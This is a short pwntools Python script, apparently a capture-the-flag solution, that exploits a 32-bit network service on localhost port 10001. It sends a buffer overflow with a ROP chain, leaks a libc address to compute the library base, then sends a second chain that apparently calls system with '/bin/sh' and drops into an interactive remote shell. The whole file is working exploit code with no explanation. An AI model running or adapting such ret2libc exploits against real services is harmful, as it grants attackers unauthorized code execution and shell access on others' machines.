from pwn import p64, u64, p32, u32
import pwn
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.remote("127.0.0.1",10001)
payload = b""
payload += b'hello world\x00\x00\x00\x00\x00'
p.send(payload)
p.recvuntil(b'you find it!\n')
payload = b"\x00" * 28
payload += p32(0x80483e0) + p32(0x80486cb) + p32(0x804a014) + p32(0x80483d0) + p32(0x80486c9) + p32(0x0) + p32(0x804a820) + p32(0xc) + p32(0x80486cb) + p32(0x804a81c) + p32(0x80484b5)
p.send(payload)
libc_base = u32(p.recv()[0:4].ljust(4,b'\x00')) + -0x67560
pwn.log.success('libc_base:' + hex(libc_base))
payload = b""
payload += p32(libc_base + 0x3cf10) + p32(0x0) + p32(libc_base + 0x17b9db)
p.send(payload)
p.interactive()
